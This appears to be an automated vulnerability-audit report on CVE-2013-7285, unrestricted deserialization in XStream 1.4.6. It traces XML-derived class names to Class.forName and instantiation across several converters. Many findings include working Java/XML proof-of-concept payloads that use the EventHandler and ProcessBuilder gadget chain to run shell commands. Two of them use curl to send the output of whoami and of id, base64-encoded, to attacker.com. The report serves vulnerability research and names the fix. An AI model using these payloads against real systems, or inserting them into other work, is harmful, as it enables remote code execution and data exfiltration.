findings.description: XStream 1.4.6 fromXML/unmarshal entry points allow unrestricted deserialization enabling OS command injection via gadget chains (CVE-2013-7285)
findings.reasoning: XStream 1.4.6 has no type filtering/allowlist mechanism. All public deserialization entry points (fromXML with String/Reader/InputStream/URL/File, and unmarshal variants) pass XML directly to the unmarshalling pipeline with no restriction on which classes can be instantiated. This allows an attacker to supply crafted XML that instantiates arbitrary classes via gadget chains. The grep search confirmed there are no addPermission/denyTypes/allowTypes/setupDefaultSecurity methods in this version. The DefaultMapper.realClass() calls Class.forName() with XML-derived class names. Combined with DynamicProxyConverter, EventHandler gadget, and ProcessBuilder/Runtime classes available on the classpath, this enables remote code execution.

evidence.code_context: No security filtering methods found in XStream.java (confirmed by grep for addPermission, denyTypes, allowTypes, setupDefaultSecurity, TypePermission - all returned 0 results). All fromXML() and unmarshal() methods directly invoke marshallingStrategy.unmarshal() with no type filtering layer.
evidence.dataflow_analysis: XML input -> fromXML(String xml) -> fromXML(new StringReader(xml)) -> unmarshal(driver.createReader(reader), null) -> marshallingStrategy.unmarshal() -> TreeUnmarshaller -> DefaultMapper.realClass(elementName) -> Class.forName(elementName) -> instantiation
evidence.notes: This is CVE-2013-7285, a well-documented critical vulnerability in XStream versions prior to 1.4.7. The EventHandler gadget chain enables OS command execution: <sorted-set><string>foo</string><dynamic-proxy><interface>java.lang.Comparable</interface><handler class='java.beans.EventHandler'><target class='java.lang.ProcessBuilder'><command><string>calc</string></command></target><action>start</action></handler></dynamic-proxy></sorted-set>

exploit_payload.code_snippet:
// CVE-2013-7285 PoC - XStream EventHandler gadget chain for OS command injection
String payload = "<sorted-set>\n" +
    "  <string>foo</string>\n" +
    "  <dynamic-proxy>\n" +
    "    <interface>java.lang.Comparable</interface>\n" +
    "    <handler class='java.beans.EventHandler'>\n" +
    "      <target class='java.lang.ProcessBuilder'>\n" +
    "        <command>\n" +
    "          <string>/bin/sh</string>\n" +
    "          <string>-c</string>\n" +
    "          <string>touch /tmp/pwned</string>\n" +
    "        </command>\n" +
    "      </target>\n" +
    "      <action>start</action>\n" +
    "    </handler>\n" +
    "  </dynamic-proxy>\n" +
    "</sorted-set>";

XStream xstream = new XStream();
xstream.fromXML(payload);  // Executes: /bin/sh -c 'touch /tmp/pwned'
exploit_payload.scenario: Attacker sends crafted XML payload to any endpoint that deserializes with XStream.fromXML() or unmarshal(), triggering the EventHandler+ProcessBuilder gadget chain to execute arbitrary OS commands
exploit_payload.category: Remote code execution via deserialization gadget chain

findings.description: XML-derived class name flows directly to Class.forName() in DefaultMapper.realClass() without any type filtering
findings.reasoning: DefaultMapper.realClass() takes the elementName string (which is derived directly from XML element names or attribute values) and passes it to Class.forName() with no allowlist or denylist filtering. Multiple code flows confirm XML-derived values reach this sink: (1) DynamicProxyConverter reads interface names and handler class attributes from XML and calls mapper.realClass(), (2) JavaClassConverter passes XML text values to mapper.realClass(), (3) EnumMapConverter/EnumSetConverter read class names from XML elements and call mapper.realClass(). The initialize=true parameter means static initializers will run on the loaded class, and subsequent instantiation will call constructors - enabling gadget chain execution.

evidence.code_context: Line 77: return Class.forName(elementName, initialize, classLoader); - elementName comes directly from XML reader values via multiple converters. No filtering or validation is applied to elementName other than a primitive type check.
evidence.dataflow_analysis: Flow 1 (JavaClassConverter): XML text -> SingleValueConverterWrapper.fromString() -> JavaClassConverter.fromString(str) -> mapper.realClass(str) -> DefaultMapper.realClass(elementName) -> Class.forName(elementName). Flow 2 (DynamicProxyConverter): XML <interface> element value -> mapper.realClass(reader.getValue()) -> Class.forName(). Flow 3 (EnumMapConverter): XML element name -> mapper.realClass(nodeName) -> Class.forName().
evidence.notes: This is the central sink for all XML-to-class-loading flows. All 27 flows documented in Query 2 converge here.

exploit_payload.code_snippet:
// XML payload exploiting DefaultMapper.realClass() to load ProcessBuilder via DynamicProxyConverter
String xml = "<dynamic-proxy>\n" +
    "  <interface>java.lang.Runnable</interface>\n" +  // elementName -> Class.forName("java.lang.Runnable")
    "  <handler class='java.beans.EventHandler'>\n" +  // class attr -> Class.forName("java.beans.EventHandler")
    "    <target class='java.lang.ProcessBuilder'>\n" +
    "      <command><string>id</string></command>\n" +
    "    </target>\n" +
    "    <action>start</action>\n" +
    "  </handler>\n" +
    "</dynamic-proxy>";
new XStream().fromXML(xml);
exploit_payload.scenario: XML element names and class attributes are passed directly to Class.forName() enabling attacker to specify any class to load and instantiate
exploit_payload.category: Arbitrary class loading leading to remote code execution

findings.description: DynamicProxyConverter uses XML-derived class names to create Java dynamic proxies with arbitrary InvocationHandlers, enabling CVE-2013-7285 gadget chain (EventHandler → ProcessBuilder.start())
findings.reasoning: DynamicProxyConverter.unmarshal() reads interface class names and handler class names directly from XML and passes them to mapper.realClass() (which calls Class.forName()). It then instantiates the handler class and creates a Java dynamic proxy. An attacker can specify java.beans.EventHandler as the handler, which implements InvocationHandler and can invoke arbitrary methods on arbitrary target objects. When the proxy's compareTo() method is called (e.g., by TreeSet during deserialization), EventHandler dispatches to ProcessBuilder.start(), executing an OS command. This is the exact mechanism of CVE-2013-7285.

evidence.code_context: Line 108: interfaces.add(mapper.realClass(reader.getValue())) - XML element value becomes interface class. Line 112: handlerType = mapper.realClass(reader.getAttribute(attributeName)) - XML class attribute becomes handler type. Line 127: handler = (InvocationHandler) context.convertAnother(proxy, handlerType) - handler instantiated. Line 133: proxy = Proxy.newProxyInstance(..., interfacesAsArray, handler) - proxy created with attacker-controlled interfaces and handler.
evidence.dataflow_analysis: XML <interface> value -> reader.getValue() -> mapper.realClass() -> Class.forName() [line 108]. XML handler class attr -> reader.getAttribute() -> mapper.realClass() -> Class.forName() [line 112]. Both flows confirmed by Query 3 codeFlows.
evidence.notes: This converter is registered by default in XStream without any restriction. It is the primary enabler of CVE-2013-7285.

exploit_payload.code_snippet:
// CVE-2013-7285 - DynamicProxyConverter gadget chain
// EventHandler as InvocationHandler dispatches to ProcessBuilder.start()
String payload = "<sorted-set>\n" +
    "  <string>foo</string>\n" +
    "  <dynamic-proxy>\n" +
    "    <interface>java.lang.Comparable</interface>\n" +
    "    <handler class='java.beans.EventHandler'>\n" +
    "      <target class='java.lang.ProcessBuilder'>\n" +
    "        <command>\n" +
    "          <string>/bin/bash</string>\n" +
    "          <string>-c</string>\n" +
    "          <string>curl http://attacker.com/$(whoami)</string>\n" +
    "        </command>\n" +
    "      </target>\n" +
    "      <action>start</action>\n" +
    "    </handler>\n" +
    "  </dynamic-proxy>\n" +
    "</sorted-set>";
new XStream().fromXML(payload); // RCE via EventHandler -> ProcessBuilder.start()
exploit_payload.scenario: Attacker supplies XML with a dynamic-proxy element specifying java.beans.EventHandler as handler targeting ProcessBuilder; when the proxy's compareTo() is triggered during TreeSet deserialization, it calls ProcessBuilder.start() executing attacker-specified OS commands
exploit_payload.category: Remote code execution via EventHandler gadget chain

findings.description: JavaClassConverter passes XML text value directly to mapper.realClass() (Class.forName()) enabling arbitrary class loading from XML input
findings.reasoning: JavaClassConverter.fromString() receives an XML text value (the string content of an XML element containing a Java class name) and directly passes it to mapper.realClass() which calls Class.forName() with no validation. This allows an attacker to specify any fully-qualified class name in XML that will be loaded. This is triggered when XStream deserializes a field of type java.lang.Class - the XML text value becomes the class to load. This path is confirmed by Query 6 (java/xstream-javaclass-to-forname) codeFlows showing the full path from SingleValueConverterWrapper → JavaClassConverter.fromString → mapper.realClass → DefaultMapper.realClass → Class.forName().

evidence.code_context: JavaClassConverter.fromString(str) at line 67-72: The 'str' parameter is the raw XML text value, passed directly to mapper.realClass(str) with no sanitization or allowlist check.
evidence.dataflow_analysis: XML text value -> SingleValueConverterWrapper.fromString(str) [line 41] -> JavaClassConverter.fromString(str) [line 67] -> mapper.realClass(str) [line 69] -> DefaultMapper.realClass(elementName) [line 63] -> Class.forName(elementName) [line 77]. Two code flow paths confirmed in Query 6 codeFlows.
evidence.notes: This converter handles java.lang.Class fields - any Class field in an object being deserialized via XStream can be set to any class the attacker specifies.

exploit_payload.scenario: Attacker provides XML with class names in Class-typed fields, causing Class.forName() to load arbitrary classes from the classpath

findings.description: SerializableConverter loads XML-derived class names and invokes readObject() serialization lifecycle methods on instantiated objects, completing the gadget chain execution path
findings.reasoning: SerializableConverter.doUnmarshal() reads class names from XML (either the node name or a class attribute) via mapper.realClass(), then reflectively calls readObject() on the instantiated class. This allows an attacker to: (1) specify any class name in XML that will be loaded via Class.forName(), (2) have that class's readObject() method invoked via reflection. Many JDK classes have readObject() methods that can be chained into gadget chains (Commons Collections, Spring, etc.). The callReadObject() invocation via reflection is confirmed in SerializationMethodInvoker at line 113.

evidence.code_context: Line 445: mapper.realClass(nodeName) - XML node name becomes class. Line 447: mapper.realClass(classAttribute) - XML class attribute becomes class. Line 452: serializationMethodInvoker.callReadObject(currentType[0], result, objectInputStream) - readObject() called on XML-derived class instance via reflection.
evidence.dataflow_analysis: XML node name/class attr -> mapper.realClass() -> Class.forName() -> class loaded -> serializationMethodInvoker.callReadObject() -> Method.invoke(readObject) on arbitrary class. Confirmed by Query 9 codeFlows showing 13 paths to this sink.
evidence.notes: Combined with commons-collections or other gadget libraries on classpath, this enables full RCE via readObject() gadget chains.

exploit_payload.scenario: Attacker provides XML that causes SerializableConverter to call readObject() on a gadget class, triggering a Commons Collections chain for RCE
exploit_payload.prerequisites: Gadget library (e.g., Commons Collections) on classpath
exploit_payload.category: Remote code execution via readObject gadget chain

findings.description: AbstractReflectionConverter.instantiateNewInstance() calls reflectionProvider.newInstance() on XML-derived class, enabling arbitrary object instantiation completing gadget chain execution
findings.reasoning: AbstractReflectionConverter.instantiateNewInstance() reads the "resolves-to" attribute from XML (which is a class name), calls mapper.realClass() on it (Class.forName()), and then calls reflectionProvider.newInstance() to instantiate it. This means an attacker can use the resolves-to attribute in any XML element to specify the actual class to instantiate, bypassing the expected type. This is a critical part of the instantiation chain - multiple code flows in Query 9 show XML-derived classes flowing to this newInstance() call. Additionally line 71 (marshal method) also participates in the gadget chain via writeReplace() reflection invocation.

evidence.code_context: Line 552: reflectionProvider.newInstance(mapper.realClass(readResolveValue)) - XML 'resolves-to' attribute value -> Class.forName() -> newInstance(). This allows an attacker to specify any class to instantiate even when the field type is different.
evidence.dataflow_analysis: Multiple flows from Query 9 show class loaded from various XML sources (DynamicProxyConverter line 112, FontConverter line 102, NamedArrayConverter line 91) flowing through TreeUnmarshaller -> DefaultMapper -> AbstractReflectionConverter.newInstance() at line 71/551.
evidence.notes: The 'resolves-to' attribute is the XML class aliasing mechanism. Without type filtering, this lets attackers substitute any class for the expected type during deserialization.

exploit_payload.scenario: Attacker uses XML 'resolves-to' attribute to substitute an arbitrary dangerous class (e.g., ProcessBuilder) for the expected type during deserialization

findings.description: SerializationMethodInvoker.callReadObject() invokes readObject() via reflection on XML-derived class instances, enabling serialization gadget chain execution
findings.reasoning: SerializationMethodInvoker.callReadObject() uses reflection to invoke the readObject() method on an object whose class was determined by XML input. Since there is no type filtering in XStream 1.4.6, the 'type' parameter here can be any class on the classpath that has a readObject() method. This is a critical execution point in gadget chains - many known gadget libraries (Commons Collections, Spring, Groovy, etc.) contain classes with readObject() methods that trigger dangerous operations. The callReadResolve() and callWriteReplace() methods (lines 65 and 88) face the same issue.

evidence.code_context: Line 117: readObjectMethod.invoke(object, new Object[]{stream}) - arbitrary readObject() invocation via reflection. The 'type' comes from SerializableConverter which loads it from XML via mapper.realClass(). No type validation before calling Method.invoke().
evidence.dataflow_analysis: XML class name -> SerializableConverter.doUnmarshal() -> mapper.realClass(nodeName) -> Class loaded -> serializationMethodInvoker.callReadObject(currentType[0], result, stream) -> readObjectMethod.invoke()
evidence.notes: callReadResolve() at line 65 and callWriteReplace() at line 88 face similar issues - both use reflection to invoke methods on XML-derived class instances.

exploit_payload.scenario: Attacker supplies XML that causes SerializationMethodInvoker to invoke readObject() on a gadget class such as PriorityQueue with Commons Collections transformer chain, resulting in arbitrary command execution
exploit_payload.category: Remote code execution via readObject gadget chain

findings.description: BeanProvider.newInstance() instantiates XML-derived classes completing the gadget chain - loaded class flows to object instantiation enabling gadget chain execution
findings.reasoning: BeanProvider.newInstance() is called from JavaBeanConverter.unmarshal() with a class derived from XML input (after flowing through DynamicProxyConverter or other converters). The class passed to newInstance() is determined by the XML content - there is no type filtering between reading the class name from XML and instantiating it. Multiple code flows in Query 9 confirm XML-derived class names flow through TreeUnmarshaller → DefaultConverterLookup → JavaBeanConverter → BeanProvider.newInstance(). This allows an attacker to have any class on the classpath instantiated.

evidence.code_context: BeanProvider.java line 142: return newInstance(type) - 'type' is an XML-derived class. Called from JavaBeanConverter.unmarshal() at line 80-81, which receives the type from TreeUnmarshaller which got it from DefaultMapper.realClass().
evidence.dataflow_analysis: XML element class -> DynamicProxyConverter/FontConverter line 112/102 -> context.convertAnother()/context.getRequiredType() -> TreeUnmarshaller.convert() -> DefaultConverterLookup -> JavaBeanConverter -> BeanProvider.newInstance(type). Confirmed by 34 code flow paths in Query 9.
evidence.notes: BeanProvider.newInstance() attempts to call the no-arg constructor, which can trigger static initializers and constructor side effects on dangerous classes.

exploit_payload.scenario: XML-derived class names flow through JavaBeanConverter to BeanProvider.newInstance(), instantiating dangerous classes like EventHandler that can be used in proxy-based gadget chains

findings.description: UseAttributeForEnumMapper.createEnumMapper() loads XML-derived class and instantiates it via DependencyInjectionFactory, enabling gadget chain execution
findings.reasoning: UseAttributeForEnumMapper.createEnumMapper() performs dynamic class loading via Class.forName() and then instantiates the loaded class via DependencyInjectionFactory.newInstance(). While these specific class names are hardcoded, the pattern flows to DependencyInjectionFactory.newInstance() at line 47 which is also reached by other XML-derived class flows (as shown in Query 9 code flows). DependencyInjectionFactory.newInstance() at line 47 takes a Class object and calls its constructor via reflection - when reached with XML-derived classes, this completes the instantiation gadget chain.

evidence.code_context: UseAttributeForEnumMapper lines 55-59: Class.forName() calls for hardcoded class names. Line 59: DependencyInjectionFactory.newInstance(useAttributeClass, ...) - instantiation via reflection. Query 9 shows this flows to DependencyInjectionFactory.java line 47.
evidence.dataflow_analysis: UseAttributeForEnumMapper.createEnumMapper() loads classes and instantiates them via DependencyInjectionFactory. Query 9 codeFlow confirms: UseAttributeForEnumMapper lines 55-57 -> line 59 -> DependencyInjectionFactory line 46-47 (newInstance via Constructor.newInstance()).
evidence.notes: DependencyInjectionFactory.newInstance() at line 47 uses Constructor.newInstance() which is also reachable from XML-derived class flows from JVM.loadClassForName() -> JVM lines 126, 256, 267.

exploit_payload.scenario: XML-derived class names flow through XStream's mapper chain to DependencyInjectionFactory.newInstance(), instantiating dangerous classes as part of the deserialization gadget chain

findings.description: XStream 1.4.6 has no type allowlist/denylist security filtering framework - only 1 incidental security-related method found (vs the addPermission/setupDefaultSecurity API introduced in 1.4.7), making all deserialization entry points vulnerable to gadget chain attacks
findings.reasoning: Query 4 (java/xstream-no-type-filtering) confirmed that XStream 1.4.6 has only 1 security filter method vs the proper security filtering API introduced in XStream 1.4.7 (addPermission(), denyTypes(), allowTypes(), setupDefaultSecurity()). The grep search confirmed this - no addPermission/denyTypes/allowTypes/setupDefaultSecurity/TypePermission methods exist in this codebase. Without type filtering: (1) any class on the JVM classpath can be instantiated via XML, (2) the EventHandler+ProcessBuilder gadget chain works with zero prerequisites, (3) all 13 fromXML/unmarshal entry points are unprotected. Query 5 found only registerConverter() and alias() methods, which are not security controls - they only affect XML/class name mappings, not which classes are permitted to be deserialized.

evidence.code_context: Query 4 result: 'XStream class: checking for security filtering methods - 1 security filter methods found' at XStream.java line 291. Query 5 found only: registerConverter (params 1 and 2 at lines 1384/1388/1394/1398), addDefaultImplementation (line 1360), alias (lines 1175/1211). None of these are type security controls.
evidence.dataflow_analysis: grep for addPermission/denyTypes/allowTypes/setupDefaultSecurity/TypePermission returned 0 results in the entire XStream source directory - confirming no security filtering API exists in this version.
evidence.notes: XStream 1.4.7 introduced XStream.setupDefaultSecurity() and addPermission() to address CVE-2013-7285. This 1.4.6 codebase lacks these methods entirely. The fix requires upgrading to >= 1.4.7 and calling XStream.setupDefaultSecurity(xstream) before use.

exploit_payload.code_snippet:
// XStream 1.4.6 - no security filtering - any of 13 entry points are exploitable
// Minimal PoC with zero prerequisites (no gadget libraries needed - uses JDK built-ins)
XStream xstream = new XStream();  // No setupDefaultSecurity() possible in 1.4.6

// EventHandler + ProcessBuilder gadget (JDK built-in, no extra deps needed)
String payload = "<sorted-set>" +
    "<string>foo</string>" +
    "<dynamic-proxy>" +
    "<interface>java.lang.Comparable</interface>" +
    "<handler class='java.beans.EventHandler'>" +
    "<target class='java.lang.ProcessBuilder'>" +
    "<command><string>/bin/sh</string><string>-c</string>" +
    "<string>curl http://attacker.com/rce?out=$(id|base64)</string></command>" +
    "</target><action>start</action>" +
    "</handler></dynamic-proxy></sorted-set>";

// All 13 entry points work:
xstream.fromXML(payload);              // String
xstream.fromXML(new StringReader(payload)); // Reader  
xstream.unmarshal(reader);             // HierarchicalStreamReader
exploit_payload.scenario: XStream 1.4.6 has no type security filtering API whatsoever; any of the 13 public deserialization entry points can be exploited with the JDK-native EventHandler+ProcessBuilder gadget chain requiring no additional libraries
exploit_payload.category: Remote code execution via unrestricted deserialization
